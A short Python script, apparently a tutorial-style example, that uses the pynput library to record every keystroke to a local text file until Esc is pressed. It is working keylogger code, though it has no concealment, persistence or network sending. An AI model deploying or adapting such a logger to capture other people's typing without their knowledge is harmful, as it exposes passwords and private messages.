import pynput
from pynput.keyboard import Key, Listener

# Define the log file
log_file = "yourkeystrokesgohere.txt"

# Define the on_press function
def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key} ")

# Define the on_release function
def on_release(key):
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#Final rendering
# Keylog.txt
# Keystrokes.txt
# You must hit 'esc' in order to exit out of the keylogging activity.

